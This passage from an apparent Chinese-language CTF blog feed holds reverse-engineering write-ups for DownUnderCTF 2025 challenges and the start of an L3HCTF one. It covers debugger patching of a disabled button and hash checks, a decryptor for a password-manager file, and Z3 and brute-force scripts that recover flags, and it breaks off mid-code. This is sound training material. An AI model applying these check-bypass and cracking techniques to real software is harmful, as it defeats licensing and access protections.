class="line">&#125;</span><br></pre></td></tr></table></figure><p>目前输入：</p><blockquote><p>Hydr0ph110a3</p></blockquote><p>这边是校验p[9]，通过爆破就可以得到p[9]</p><p><img src="/2025/07/21/DownUnderCTF2025/image-33.png" alt="alt text"></p><p>爆破代码：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">32</span>; i &lt; <span class="number">127</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> ((i ^ <span class="number">0xcb</span> &amp; <span class="number">0x64</span>) == <span class="number">0x2e</span>)</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>, i);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// p[9] = &#x27;n&#x27;</span></span><br></pre></td></tr></table></figure><p>目前输入：</p><blockquote><p>Hydr0ph11na3</p></blockquote><p>只剩下p[7] p[8]以及p[11]，但是已经知道p[7]&#x3D;&#x3D;p[8]且只能是12345678其中一个，p[11]&#x3D;&#x3D;p[7]-2，那么手动输入试试就可以得到最终的正确password。</p><p>最后尝试发现分别就是1、1、3。</p><p>最终输入：</p><blockquote><p>Hydr0ph11na3</p></blockquote><p><img src="/2025/07/21/DownUnderCTF2025/image-34.png" alt="alt text"></p><p><strong>DUCTF{the_problem_with_dynamic_languages_is_you_cant_c_types}</strong></p><h2 id="SwiftPasswordManager-ClickMe"><a href="#SwiftPasswordManager-ClickMe" class="headerlink" title="SwiftPasswordManager-ClickMe"></a>SwiftPasswordManager-ClickMe</h2><p>根据题目描述，可知窗口界面有一个Flag按钮，但是无法点击，应该是初始化控件的时候被禁用了。</p><p>尝试字符串搜索Flag，但是没搜到，猜测可能是因为4字节字符串比较短，直接被优化成4字节立即数在汇编里面，直接搜Flag字符串的字节，可以搜索到，反编译界面这边可以看到是Flag字符串。</p><p><img src="/2025/07/21/DownUnderCTF2025/image-35.png" alt="alt text"></p><p><img src="/2025/07/21/DownUnderCTF2025/image-36.png" alt="alt text"></p><p>上图可以看到下面有个，从命名不难猜出是禁用按钮的函数。</p><blockquote><p>View.disabled(_:)(1, &amp;type metadata for Button, &amp;protocol witness table for Button);</p></blockquote><p>断点函数调用处，写断点命令，将edi也就是参数1改成0即可。</p><p><img src="/2025/07/21/DownUnderCTF2025/image-38.png" alt="alt text"></p><p>调试运行程序，虽然Flag按钮样式还是禁用的，但是可以点击，点击就弹出Flag。</p><p><img src="/2025/07/21/DownUnderCTF2025/image-39.png" alt="alt text"></p><p><strong>DUCTF{just_because_the_button_is_greyed_out_doesnt_mean_you_cant_use_it}</strong></p><h2 id="SwiftPasswordManager-LoadMe"><a href="#SwiftPasswordManager-LoadMe" class="headerlink" title="SwiftPasswordManager-LoadMe"></a>SwiftPasswordManager-LoadMe</h2><p>点击Load按钮，提示没有按钮事件实现，那么只能从Save按钮事件逆向出保存的文件结构，然后写解密，利用题目提供的”DUCTF2025!”密码进行解密题目给的加密文件。</p><p><img src="/2025/07/21/DownUnderCTF2025/image-40.png" alt="alt text"></p><p>函数可以搜到saveFile的函数实现。</p><p><img src="/2025/07/21/DownUnderCTF2025/image-41.png" alt="alt text"></p><p>里面调用的一个函数就是核心函数，加密数据导出到文件的。</p><p><img src="/2025/07/21/DownUnderCTF2025/image-42.png" alt="alt text"></p><p>由于函数代码量大难读懂，直接将整个函数丢给Gemini2.5 Pro进行分析，得到以下文件结构。</p><table><thead><tr><th align="center">字节数</th><th align="center">描述</th></tr></thead><tbody><tr><td align="center">4</td><td align="center">“SMP1”</td></tr><tr><td align="center">4</td><td align="center">0x01 0x00 0x00 0x00</td></tr><tr><td align="center">2</td><td align="center">Salt长度</td></tr><tr><td align="center">32</td><td align="center">Salt数据</td></tr><tr><td align="center">2</td><td align="center">Nonce长度</td></tr><tr><td align="center">可变</td><td align="center">Nonce数据</td></tr><tr><td align="center">2</td><td align="center">Tag长度</td></tr><tr><td align="center">可变</td><td align="center">Tag数据</td></tr><tr><td align="center">4</td><td align="center">密文长度</td></tr><tr><td align="center">可变</td><td align="center">密文</td></tr></tbody></table><p>大致代码流程：</p><ol><li>获取32个随机数字节</li><li>将32个随机数字节作为Salt对密码进行0xAAAA次hash</li><li>生成Nonce、Tag，将hash后的数据当作AES密钥。</li><li>将Title、Username、Password、Notes进行AES GCM加密</li><li>按以上表格结构写到文件。</li></ol><p>那么从加密文件读取Salt、Nonce、Tag、密文，就可以进行密钥生成+AES解密，得到明文。</p><h3 id="解密代码"><a href="#解密代码" class="headerlink" title="解密代码"></a>解密代码</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">from</span> cryptography.hazmat.primitives.ciphers.aead <span class="keyword">import</span> AESGCM</span><br><span class="line"><span class="keyword">from</span> cryptography.exceptions <span class="keyword">import</span> InvalidTag</span><br><span class="line"></span><br><span class="line">PASSWORD = <span class="string">&quot;DUCTF2025!&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">derive_key</span>(<span class="params">password: <span class="built_in">bytes</span>, salt: <span class="built_in">bytes</span></span>) -&gt; <span class="built_in">bytes</span>:</span><br><span class="line">    derived_key = password</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0xAAAA</span>):</span><br><span class="line">        hasher = hashlib.sha256()</span><br><span class="line">        hasher.update(derived_key)</span><br><span class="line">        hasher.update(salt)</span><br><span class="line">        derived_key = hasher.digest()</span><br><span class="line">            </span><br><span class="line">    <span class="keyword">return</span> derived_key</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt_file</span>(<span class="params">file_path: <span class="built_in">str</span></span>):</span><br><span class="line"></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(file_path, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        magic_number = f.read(<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">        magic_number2 = struct.unpack(<span class="string">&#x27;&lt;HH&#x27;</span>, f.read(<span class="number">4</span>))</span><br><span class="line"></span><br><span class="line">        salt_len, = struct.unpack(<span class="string">&#x27;&lt;H&#x27;</span>, f.read(<span class="number">2</span>))</span><br><span class="line">        salt = f.read(salt_len)</span><br><span class="line"></span><br><span class="line">        nonce_len, = struct.unpack(<span class="string">&#x27;&lt;H&#x27;</span>, f.read(<span class="number">2</span>))</span><br><span class="line">        nonce = f.read(nonce_len)</span><br><span class="line"></span><br><span class="line">        tag_len, = struct.unpack(<span class="string">&#x27;&lt;H&#x27;</span>, f.read(<span class="number">2</span>))</span><br><span class="line">        tag = f.read(tag_len)</span><br><span class="line"></span><br><span class="line">        ciphertext_len, = struct.unpack(<span class="string">&#x27;&lt;I&#x27;</span>, f.read(<span class="number">4</span>))</span><br><span class="line">        ciphertext = f.read(ciphertext_len)</span><br><span class="line"></span><br><span class="line">        password_bytes = PASSWORD.encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">        encryption_key = derive_key(password_bytes, salt)</span><br><span class="line"></span><br><span class="line">        aesgcm = AESGCM(encryption_key)</span><br><span class="line"></span><br><span class="line">        encrypted_data_with_tag = ciphertext + tag</span><br><span class="line">        </span><br><span class="line">        decrypted_data = aesgcm.decrypt(nonce, encrypted_data_with_tag, <span class="literal">None</span>)</span><br><span class="line">        </span><br><span class="line">        <span class="built_in">print</span>(decrypted_data)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    encrypted_file = <span class="string">r&quot;passwords.spm&quot;</span></span><br><span class="line">    decrypt_file(encrypted_file)</span><br><span class="line"></span><br><span class="line"><span class="comment"># b&#x27;\x01\x00\x00\x00\x1a\x1c\x86\xd2\x7f\xa8EQ\xbe\xd1\xcc\n\x04e\x8f&lt;\x08\x00\x00\x00computer\x04\x00\x00\x00user\r\x00\x00\x00cool password7\x00\x00\x00DUCTF&#123;the_password_is_cool_but_the_flag_is_even_cooler&#125;\xd4\x82^h\x00\x00\x00\x00\xe7\x82^h\x00\x00\x00\x00&#x27;</span></span><br></pre></td></tr></table></figure><p><strong>DUCTF{the_password_is_cool_but_the_flag_is_even_cooler}</strong></p><h2 id="SwiftPasswordManager-CrackMe"><a href="#SwiftPasswordManager-CrackMe" class="headerlink" title="SwiftPasswordManager-CrackMe"></a>SwiftPasswordManager-CrackMe</h2><p>题目说如果输入一个好的Password，就会获得一个Flag，那么应该就是在编辑框输入事件做了什么校验。</p><p>函数窗口可以搜到onChange事件，查看交叉调用发现就这一处调用了，参数1函数就是OnChange事件的回调函数。</p><p><img src="/2025/07/21/DownUnderCTF2025/image-46.png" alt="alt text"></p><p><img src="/2025/07/21/DownUnderCTF2025/image-47.png" alt="alt text"></p><p>开头是检测输入的字符串的Prefix和Suffix，也就是前缀和后缀是否为”DU”和”.}”。</p><p><img src="/2025/07/21/DownUnderCTF2025/image-48.png" alt="alt text"></p><p>下面有多次单字节校验，以这个为例子。</p><p>先调用_sSS5index_8offsetBySS5IndexVAD_SitF获取一个实例，参数2的2指的是输入字符串的下标2，然后调用_sSSySJSS5IndexVcig获取字符串下标2的字节，然后xor ‘C’，要让条件不满足，也就是下标2的字符要是’C’，这样就得到了一个已知明文字节。</p><p><img src="/2025/07/21/DownUnderCTF2025/image-49.png" alt="alt text"></p><p>从前面的这几个相同的判断代码，可以得到完整的开头和结尾，开头是”DUCTF{“，结尾是”.}”。</p><p>下面接着判断去掉前缀”DUCTF{“和后缀”.}”剩下的字符串长度是否为0x1D。</p><p>那么先构造一个字符串方便动调观察数据。</p><blockquote><p>DUCTF{1234567890abcdefghijklmnopqrs.}</p></blockquote><p><img src="/2025/07/21/DownUnderCTF2025/image-50.png" alt="alt text"></p><p>获取去掉前后缀的字符串，获取最后一位是否为”.”。</p><p><img src="/2025/07/21/DownUnderCTF2025/image-51.png" alt="alt text"></p><p>然后是两次hash判断，第一次是将去前后缀字符串进行hash，判断低32位，第二次是将去前后缀字符串翻转，再进行hash，判断高32位，两次判断校验，这边目前就只能将这两个校验绕过，因为不知道完整的输入。</p><p><img src="/2025/07/21/DownUnderCTF2025/image-52.png" alt="alt text"></p><p><img src="/2025/07/21/DownUnderCTF2025/image-53.png" alt="alt text"></p><p>都在cmp处将对应比对值改成目标值就可以绕过。</p><p><img src="/2025/07/21/DownUnderCTF2025/image-54.png" alt="alt text"></p><p><img src="/2025/07/21/DownUnderCTF2025/image-55.png" alt="alt text"></p><p>这边将字符串重新打乱，下面通过下标取字符的时候要注意，动调看实际取出数据是多少，然后去看对应输入的原字符串下标是多少。</p><p><img src="/2025/07/21/DownUnderCTF2025/image-56.png" alt="alt text"></p><p>下面跟着的都是差不多的xor比对，有单字节有多字节，都是一样的做法得到对应位置的明文字节。</p><p>有个特殊的，是方程组，下面注释的下标是对应原完整字符串的下标，包括前后缀的，使用Z3求解即可得到三个字符。</p><p><img src="/2025/07/21/DownUnderCTF2025/image-57.png" alt="alt text"></p><p>z3脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p20 = Int(<span class="string">&#x27;p20&#x27;</span>)</span><br><span class="line">p21 = Int(<span class="string">&#x27;p21&#x27;</span>)</span><br><span class="line">p30 = Int(<span class="string">&#x27;p30&#x27;</span>)</span><br><span class="line"></span><br><span class="line">s = Solver()</span><br><span class="line"></span><br><span class="line">s.add(p20 + <span class="number">2</span>*p21 + <span class="number">3</span>*p30 == <span class="number">383</span>)</span><br><span class="line">s.add(<span class="number">5</span>*p21 + <span class="number">4</span>*p20 + <span class="number">6</span>*p30 == <span class="number">959</span>)</span><br><span class="line">s.add(<span class="number">9</span>*(p20 + p30) + <span class="number">8</span>*p21 == <span class="number">1641</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> s.check() == sat:</span><br><span class="line">    m = s.model()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;p20 = <span class="subst">&#123;m[p20]&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;p21 = <span class="subst">&#123;m[p21]&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;p30 = <span class="subst">&#123;m[p30]&#125;</span>&quot;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;No solution found.&quot;</span>)</span><br></pre></td></tr></table></figure><p>下面有个大循环，这边获取第i个和i+1个下标，i从0开始，步长为2，但对应的字符串不是原始的，也是打乱后的，所以还是动调看到底取的字符是对应原字符串的哪个下标。</p><p>动调发现是取原完整字符串p[22] p[23] p[24] p[25]四个字符串，两个字符一组进行一次循环。</p><p><img src="/2025/07/21/DownUnderCTF2025/image-58.png" alt="alt text"></p><p>这边第一处取p[i+1]然后-1，第二处取p[i]然后+1。</p><p><img src="/2025/07/21/DownUnderCTF2025/image-59.png" alt="alt text"></p><p><img src="/2025/07/21/DownUnderCTF2025/image-60.png" alt="alt text"></p><p>将两个数据先后往后加入字节，如：v212&#x3D;0x31，v282&#x3D;0x71，那么最后往后添加得到0x3171。</p><p><img src="/2025/07/21/DownUnderCTF2025/image-61.png" alt="alt text"></p><p>一共四个字节，分成两组，最后得到四字节，这边进行比较，那么按+1-1就可以从这边还原出原来的四个明文字节。</p><p>“1q”是第一组，”e^”是第二组，分别-1+1得到”0r”，”d_”，合起来就是”0rd_”，对应原完整字符串p[22] p[23] p[24] p[25]四个字节。</p><p><img src="/2025/07/21/DownUnderCTF2025/image-62.png" alt="alt text"></p><p>最后一个校验还是z3，同样写脚本解方程即可。</p><p><img src="/2025/07/21/DownUnderCTF2025/image-63.png" alt="alt text"></p><p>z3脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p8 = Int(<span class="string">&#x27;p8&#x27;</span>)</span><br><span class="line">p12 = Int(<span class="string">&#x27;p12&#x27;</span>)</span><br><span class="line">p14 = Int(<span class="string">&#x27;p14&#x27;</span>)</span><br><span class="line"></span><br><span class="line">s = Solver()</span><br><span class="line"></span><br><span class="line">s.add(p8 + <span class="number">2</span>*p12 + <span class="number">3</span>*p14 == <span class="number">552</span>)</span><br><span class="line">s.add(<span class="number">5</span>*p12 + <span class="number">4</span>*p8 + <span class="number">6</span>*p14 == <span class="number">1404</span>)</span><br><span class="line">s.add(<span class="number">6</span>*p8 + <span class="number">8</span>*p12 + <span class="number">9</span>*p14 == <span class="number">2145</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> s.check() == sat:</span><br><span class="line">    m = s.model()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;p8 = <span class="subst">&#123;m[p8]&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;p12 = <span class="subst">&#123;m[p12]&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;p14 = <span class="subst">&#123;m[p14]&#125;</span>&quot;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;No solution found.&quot;</span>)</span><br></pre></td></tr></table></figure><p>得到”oN_”三个明文字节，根据上面所有校验，目前可以得到以下字符串：</p><blockquote><p>DUCTF{cho05iNg_?_p4s5W0rd_15_h4?d…}</p></blockquote><p>问号是未知字节，这两个未知的字节在全程没有被校验过，但是开头有对去前后缀字符串进行的两次hash校验，可以根据这个点来爆破出剩下的两个字节。</p><p><img src="/2025/07/21/DownUnderCTF2025/image-64.png" alt="alt text"></p><h3 id="爆破脚本"><a href="#爆破脚本" class="headerlink" title="爆破脚本"></a>爆破脚本</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">class</span> <span class="title class_">T</span>&gt;</span><br><span class="line">T __ROL__(T value, <span class="type">int</span> count)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">const</span> <span class="type">uint32_t</span> nbits = <span class="built_in">sizeof</span>(T) * <span class="number">8</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (count &gt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        count %= nbits;</span><br><span class="line">        T high = value &gt;&gt; (nbits - count);</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">T</span>(<span class="number">-1</span>) &lt; <span class="number">0</span>)</span><br><span class="line">            high &amp;= ~((<span class="built_in">T</span>(<span class="number">-1</span>) &lt;&lt; count));</span><br><span class="line">        value &lt;&lt;= count;</span><br><span class="line">        value |= high;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        count = -count % nbits;</span><br><span class="line">        T low = value &lt;&lt; (nbits - count);</span><br><span class="line">        value &gt;&gt;= count;</span><br><span class="line">        value |= low;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> value;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">inline</span> DWORD64 __ROL8__(DWORD64 value, <span class="type">int</span> count) &#123; <span class="keyword">return</span> __ROL__((DWORD64)value, count); &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// String.h()函数</span></span><br><span class="line"><span class="function">DWORD64 <span class="title">hash</span><span class="params">(<span class="type">uint8_t</span> *input)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    DWORD64 v0 = <span class="number">0x811C9DC5LL</span>;</span><br><span class="line">    DWORD64 i&#123;&#125;;</span><br><span class="line">    <span class="type">uint8_t</span> v2 = input[<span class="number">0</span>];</span><br><span class="line">    <span class="type">int</span> c&#123;&#125;;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">16777619</span>; c &lt; <span class="number">29</span>; v2 = input[c])</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">auto</span> v5 = c + <span class="number">1</span>;</span><br><span class="line">        v0 = v2 ^ __ROL8__(v0, <span class="number">7</span>);</span><br><span class="line">        i = <span class="number">33</span> * i + v2 * v5;</span><br><span class="line">        c++;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> v0 ^ __ROL8__(i, <span class="number">32</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">0xffff</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line"><span class="comment">// 获取两个爆破字节</span></span><br><span class="line">        <span class="keyword">auto</span> a1 = i &amp; <span class="number">0xff</span>, a2 = (i &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xff</span>;</span><br><span class="line"></span><br><span class="line">        <span class="type">uint8_t</span> input1[] = <span class="string">&quot;cho05iNg_?_p4s5W0rd_15_h4?d..&quot;</span>;</span><br><span class="line">        input1[<span class="number">9</span>] = a1;</span><br><span class="line">        input1[<span class="number">25</span>] = a2;</span><br><span class="line">        <span class="keyword">auto</span> hash_result1 = <span class="built_in">hash</span>(input1) &amp; <span class="number">0xffffffff</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (hash_result1 == <span class="number">0xD890BAB5</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;hash1 correct!\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 第二次是翻转后hash</span></span><br><span class="line">            <span class="type">uint8_t</span> input2[] = <span class="string">&quot;..dz4h_51_dr0W5s4p_j_gNi50ohc&quot;</span>;</span><br><span class="line">            input2[<span class="number">19</span>] = a1;</span><br><span class="line">            input2[<span class="number">3</span>] = a2;</span><br><span class="line">            <span class="keyword">auto</span> hash_result2 = <span class="built_in">hash</span>(input2) &gt;&gt; <span class="number">0x20</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (hash_result2 == <span class="number">0x80DD5386</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;hash2 correct!\n&quot;</span>);</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;DUCTF&#123;%.29s.&#125;\n&quot;</span>, input1);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// DUCTF&#123;cho05iNg_A_p4s5W0rd_15_h4Rd...&#125;</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>DUCTF{cho05iNg_A_p4s5W0rd_15_h4Rd…}</strong></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;DownUnderCTF-Reverse-WP&quot;&gt;&lt;a href=&quot;#DownUnderCTF-Reverse-WP&quot; class=&quot;headerlink&quot; title=&quot;DownUnderCTF Reverse WP&quot;&gt;&lt;/a&gt;DownUnderCTF Reve</summary>
      
    
    
    
    
    <category term="CTF比赛" scheme="https://tkazer.github.io/tags/CTF%E6%AF%94%E8%B5%9B/"/>
    
  </entry>
  
  <entry>
    <title>L3HCTF WP</title>
    <link href="https://tkazer.github.io/2025/07/14/L3HCTF/"/>
    <id>https://tkazer.github.io/2025/07/14/L3HCTF/</id>
    <published>2025-07-14T05:27:44.000Z</published>
    <updated>2025-07-15T02:59:41.174Z</updated>
    
    <content type="html"><![CDATA[<h1 id="L3HCTF-Reverse-WP"><a href="#L3HCTF-Reverse-WP" class="headerlink" title="L3HCTF Reverse WP"></a>L3HCTF Reverse WP</h1><p>放假生物钟已经倒过来了，每天早上10点都起不来，都是下午1-2点起床做题，全程就拿了snake的2血，其他的都因为生物钟没争取到😢，这次的XCTF强度不高，都是可以做的。</p><h2 id="TemporalParadox"><a href="#TemporalParadox" class="headerlink" title="TemporalParadox"></a>TemporalParadox</h2><p>通过字符串交叉调用找到main函数，IDA无法F5反编译，包含了许多异常。直接Delete函数，然后忽略开头这些汇编，从下面的开始按P还原函数就可以F5反编译。</p><p><img src="/2025/07/14/L3HCTF/image.png" alt="alt text"></p><p>一些参数不确定、由指针调用表示的函数，都可以直接跳转到对应函数按F5，再转回main，再按F5让IDA重新识别。</p><p>这边开头是判断了时间戳是否在某个范围内，然后执行里面的代码。</p><p><img src="/2025/07/14/L3HCTF/image-1.png" alt="alt text"></p><p>底下要求输入query，然后MD5后判断是否与目标值相等，那这边主要就研究上面时间戳范围内执行的代码。</p><p><img src="/2025/07/14/L3HCTF/image-2.png" alt="alt text"></p><p>时间戳范围内执行代码的第一个函数进来发现就是构造query的地方。</p><p><img src="/2025/07/14/L3HCTF/image-3.png" alt="alt text"></p><p>将获取的时间戳传入函数，赋值给一个全局变量。</p><p><img src="/2025/07/14/L3HCTF/image-4.png" alt="alt text"></p><p>然后循环调用一个函数进行计算，这个函数就是利用刚刚那个全局变量进行的计算，最后给v45、v48、v49、v50、v51赋值。</p><p><img src="/2025/07/14/L3HCTF/image-5.png" alt="alt text"></p><p><img src="/2025/07/14/L3HCTF/image-6.png" alt="alt text"></p><p>通过两个全局静态值以及刚刚上面得到的值进行计算，最后比较两个计算值是否相等，然后走不同的query构造代码。</p><p><img src="/2025/07/14/L3HCTF/image-7.png" alt="alt text"></p><p>由于全程计算仅仅由时间戳控制，并且已经给出时间戳范围，就可以采用时间戳爆破方法来爆破符号目标MD5的query字串。</p><p>红框处是参数值对应的变量，salt是固定的可以直接调试取到，<strong>tlkyeueq7fej8vtzitt26yl24kswrgm5</strong></p><p><img src="/2025/07/14/L3HCTF/image-8.png" alt="alt text"></p><h3 id="解密代码"><a href="#解密代码" class="headerlink" title="解密代码"></a>解密代码</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span 